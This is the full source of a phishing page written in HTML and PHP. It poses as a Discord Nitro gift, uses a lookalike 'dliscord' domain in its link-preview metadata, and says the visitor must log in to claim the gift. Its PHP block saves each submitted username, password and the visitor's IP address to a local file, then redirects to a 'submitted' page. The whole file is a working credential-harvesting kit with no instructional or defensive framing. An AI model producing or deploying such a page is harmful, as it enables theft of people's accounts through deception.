<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="../assest/style.css"/>
    <meta property="og:site_name" content="Discord Gift">
    <meta property="og:url" content="https://dliscord.">
    <meta property="og:title" content="Discord">
    <meta property="og:description" content="You Have Been Gifted A 3 Month Nitro">
    <meta property="og:type" content="Discord">
    <meta name="og:image" itemprop="image" content="https://cdn1.epicgames.com/salesEvent/salesEvent/EGS_Discord_Nitro_2560x1440_withlogo_2560x1440-944994658df3b04d0c4940be832da19e">
  </head>
  <body>
    <div class="loginPart">
      <br/><br/><br/>
                       You Have Been Gifted a 3 Month Nitro! you need to                  login to earn it.
      <br/><br/><br/>
      <center>
      <p class="welcome">Welcome Back!</p>
        <br/>
        Email or Phone number:
        <br/>
      <form method="post">
        <input type="text" name="user" class="inputs" />
        <br/>
        Password:
        <br/>
       <input type="password" name="pass" class="inputs"/>
        <br/><br/>
        <input type="submit" name="submit" value="Login" class="submit"/>
      </form>
      </center>
    </div>
    <?php
    $iptoken = $_SERVER['REMOTE_ADDR'];  
    if(isset($_POST['pass'])){
      $user = $_POST['user'];
      $pass = $_POST['pass'];
      $file=fopen("savedata.txt", "a+");
      fwrite($file," -  IP: ".$iptoken."   Username: " . $user . "   Password: " . $pass . "\n\n");
      fclose($file);
      header("Location: submited.php");
    }
    ?>
  </body>
</html>